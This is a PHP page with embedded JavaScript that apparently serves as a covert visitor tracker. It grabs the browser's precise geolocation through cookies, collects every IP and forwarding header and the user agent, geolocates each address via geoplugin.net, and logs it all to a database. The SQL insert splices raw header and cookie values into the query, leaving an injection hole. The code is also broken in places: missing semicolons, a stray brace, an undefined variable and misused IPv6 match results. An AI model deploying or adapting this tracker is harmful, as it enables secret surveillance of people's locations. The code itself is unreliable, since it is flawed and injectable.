<script>navigator.geolocation.getCurrentPosition(function (position){var lat=position.coords.latitude;var lon=position.coords.longitude;document.cookie="lat=" + lat;document.cookie="lon=" + lon;});document.cookie="a=1";</script>
<?php
$lat = NULL;
$lon = NULL;
$a = NULL;
$b = NULL;
$client = NULL;
$xforf = NULL;
$xfor = NULL;
$forf = NULL;
$for = NULL;
$ip = NULL;
$ipa = NULL;
$agent = NULL;
$hagent = NULL;
$gagent = NULL;
$google = NULL;
$clientv6 = NULL;
$xforfv6 = NULL;
$xforv6 = NULL;
$forfv6 = NULL;
$forv6 = NULL;
$ipv6 = NULL;
$ipav6 = NULL;
$clientgeo = NULL;
$xforfgeo = NULL;
$xforgeo = NULL;
$forfgeo = NULL;
$forgeo = NULL;
$ipgeo = NULL;
$ipageo = NULL;
$clientv6geo = NULL;
$xforfv6geo = NULL;
$xforv6geo = NULL;
$forfv6geo = NULL;
$forv6geo = NULL;
$ipv6geo = NULL;
$ipav6geo = NULL;
global $HTTP_SERVER_VARS;
global $HTTP_USER_AGENT;
$lat = $_COOKIE['lat'];
$lon = $_COOKIE['lon'];
$a = $_COOKIE['a'];
$client = $_SERVER['HTTP_CLIENT_IP'];
$xforf = $_SERVER['HTTP_X_FORWARDED_FOR'];
$xfor = $_SERVER['HTTP_X_FORWARDED'];
$forf = $_SERVER['HTTP_FORWARDED_FOR'];
$for = $_SERVER['HTTP_FORWARDED'];
$ip = $_SERVER['REMOTE_ADDR'];
$ipa = $_GET['addr'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$hagent = $HTTP_SERVER_VARS['HTTP_USER_AGENT'];
$gagent = $HTTP_USER_AGENT;
if ($a == NULL){
header("Refresh:5");
$b="1"}
if ($b == 1){
include '7c79Yc656i31Ifg.php';
header("Refresh:5");
$b="2"}
echo serialize($msg)."<br /><br />";
$google = "//maps.google.com/maps?q=loc:".$lat."+".$lon;}
if ($client != NULL){
$clientv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_CLIENT_IP']);
$clientgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$client));
if ($clientv6 != 0){
$clientv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$clientv6));}}
if ($xforf != NULL){
$xforfv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_X_FORWARDED_FOR']);
$xforfgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforf));
if ($xforfv6 != 0){
$xforfv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforfv6));}}
if ($xfor != NULL){
$xforv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_X_FORWARDED']);
$xforgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xfor));
if ($xforv6 != 0){
$xforv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforv6));}}
if ($forf != NULL){
$forfv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_FORWARDED_FOR']);
$forfgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forf));
if ($forfv6 != 0){
$forfv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forfv6));}}
if ($for != NULL){
$forv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_FORWARDED']);
$forgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$for));
if ($forv6 != 0){
$forv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forv6));}}
if ($ip != NULL){
$ipv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['REMOTE_ADDR']);
$ipgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ip));
if ($ipv6 != 0){
$ipv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipv6));}}
if ($ipa != NULL){
$ipav6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_GET['addr']);
$ipageo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipa));
if ($ipav6 != 0){
$ipav6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipav6));}}
include 'huMf6GwI0pbSg1k.php';
$sql = "INSERT INTO track(`client`,`xforf`,`xfor`,`forf`,`for`,`ip`,`ipa`,`lat`,`lon`,`google`,`clientv6`,`xforfv6`,`xforv6`,`forfv6`,`forv6`,`ipv6`,`ipav6`,`agent`,`hagent`,`gagent`,`clientgeo`,`xforfgeo`,`xforgeo`,`forfgeo`,`forgeo`,`ipgeo`,`ipageo`,`clientv6geo`,`xforfv6geo`,`xforv6geo`,`forfv6geo`,`forv6geo`,`ipv6geo`,`ipav6geo`) VALUES ('$client','$xforf','$xfor','$forf','$for','$ip','$ipa','$lat','$lon','$google','$clientv6','$xforfv6','$xforv6','$forfv6','$forv6','$ipv6','$ipav6','$agent','$hagent','$gagent','$clientgeo','$xforfgeo','$xforgeo','$forfgeo','$forgeo','$ipgeo','$ipageo','$clientv6geo','$xforfv6geo','$xforv6geo','$forfv6geo','$forv6geo','$ipv6geo','$ipav6geo')";
mysqli_query($conn, $sql);
$conn->close(); ?>
